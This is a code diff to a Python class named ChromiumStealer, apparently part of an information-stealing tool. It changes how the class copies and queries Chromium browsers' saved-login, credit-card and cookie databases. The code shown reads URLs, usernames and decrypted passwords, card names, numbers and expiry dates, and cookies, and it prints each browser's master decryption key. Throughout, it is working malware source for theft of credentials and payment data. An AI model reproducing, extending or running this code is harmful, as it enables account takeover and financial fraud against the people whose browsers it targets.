@@ -24,6 +24,7 @@ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
+--------------------------------------------------------------------------------------
 """
 
 
@@ -43,6 +44,8 @@ class ChromiumStealer(ModuleManager):
     
     def __init__(self) -> None:
         super().__init__(module_name="ChromiumStealer")
+        
+        self.browsers_folder = os.path.join(self.output_folder_user, 'browsers')
 
         appdata = os.getenv('LOCALAPPDATA')
         self.browsers = {
@@ -101,15 +104,26 @@ class ChromiumStealer(ModuleManager):
             print(f"\t [-] No Data Found!")
 
 
-    def get_login_data(self, path: str, profile: str, master_key):
+    def get_login_data(self, path: str, profile: str, master_key, browser_name: str):
+        result = ""
         login_db = f'{path}\\{profile}\\Login Data'
+        copy_path = os.path.join(self.browsers_folder, browser_name) 
+
         if not os.path.exists(login_db):
             return
-        result = ""
-        shutil.copy(login_db, 'login_db')
-        conn = sqlite3.connect('login_db')
+        if not os.path.isdir(copy_path):
+            os.makedirs(copy_path)
+
+        copy_path = os.path.join(copy_path, 'login.db')
+        if os.path.isfile(copy_path):
+            os.remove(copy_path)
+
+        shutil.copy(login_db, copy_path)
+
+        conn = sqlite3.connect(copy_path)
         cursor = conn.cursor()
         cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+
         for row in cursor.fetchall():
             password = self.decrypt_password(row[2], master_key)
             result += f"""\nURL: {row[0]}\nEmail: {row[1]}\nPassword: {password}"""
@@ -119,15 +133,26 @@ class ChromiumStealer(ModuleManager):
         return result
 
 
-    def get_credit_cards(self, path: str, profile: str, master_key):
+    def get_credit_cards(self, path: str, profile: str, master_key, browser_name:str):
+        result = ""
         cards_db = f'{path}\\{profile}\\Web Data'
+        copy_path = os.path.join(self.browsers_folder, browser_name) 
+        
         if not os.path.exists(cards_db):
             return
-        result = ""
-        shutil.copy(cards_db, 'cards_db')
-        conn = sqlite3.connect('cards_db')
+        if not os.path.isdir(copy_path):
+            os.makedirs(copy_path)
+        
+        copy_path = os.path.join(copy_path, 'cards.db')
+        if os.path.isfile(copy_path):
+            os.remove(copy_path)
+            
+        shutil.copy(cards_db, copy_path)
+        
+        conn = sqlite3.connect(copy_path)
         cursor = conn.cursor()
         cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+        
         for row in cursor.fetchall():
             if not row[0] or not row[1] or not row[2] or not row[3]:
                 continue
@@ -140,15 +165,26 @@ class ChromiumStealer(ModuleManager):
         return result
 
 
-    def get_cookies(self, path: str, profile: str, master_key):
+    def get_cookies(self, path: str, profile: str, master_key, browser_name:str):
+        result = ""
         cookie_db = f'{path}\\{profile}\\Network\\Cookies'
+        copy_path = os.path.join(self.browsers_folder, browser_name) 
+        
         if not os.path.exists(cookie_db):
             return
-        result = ""
-        shutil.copy(cookie_db, 'cookie_db')
-        conn = sqlite3.connect('cookie_db')
+        if not os.path.isdir(copy_path):
+            os.makedirs(copy_path)
+
+        copy_path = os.path.join(copy_path, 'cookies.db')
+        if os.path.isfile(copy_path):
+            os.remove(copy_path)
+            
+        shutil.copy(cookie_db, copy_path)
+        
+        conn = sqlite3.connect(copy_path)
         cursor = conn.cursor()
         cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
+        
         for row in cursor.fetchall():
             if not row[0] or not row[1] or not row[2] or not row[3]:
                 continue
@@ -173,18 +209,16 @@ class ChromiumStealer(ModuleManager):
         for browser in available_browsers:
             browser_path = self.browsers[browser]
             master_key = self.get_master_key(browser_path)
+            print("\n\n\n", "="*50, "\n\n\n")
+            print(browser)
+            print(browser_path)
+            print(master_key)
+            
             print(f"Getting Stored Details from {browser}")
 
-            print("\t [!] Getting Saved Passwords")
-            self.save_results(browser, 'Saved_Passwords', self.get_login_data(browser_path, "Default", master_key))
-            print("\t------\n")
-
-            print("\t [!] Getting Cookies")
-            self.save_results(browser, 'Browser_Cookies', self.get_cookies(browser_path, "Default", master_key))
-            print("\t------\n")
-
-            print("\t [!] Getting Saved Credit Cards")
-            self.save_results(browser, 'Saved_Credit_Cards', self.get_credit_cards(browser_path, "Default", master_key))
+            self.save_results(browser, 'Saved_Passwords', self.get_login_data(browser_path, "Default", master_key, browser_name=browser))
+            self.save_results(browser, 'Browser_Cookies', self.get_cookies(browser_path, "Default", master_key, browser_name=browser))
+            self.save_results(browser, 'Saved_Credit_Cards', self.get_credit_cards(browser_path, "Default", master_key, browser_name=browser))
 
 
     
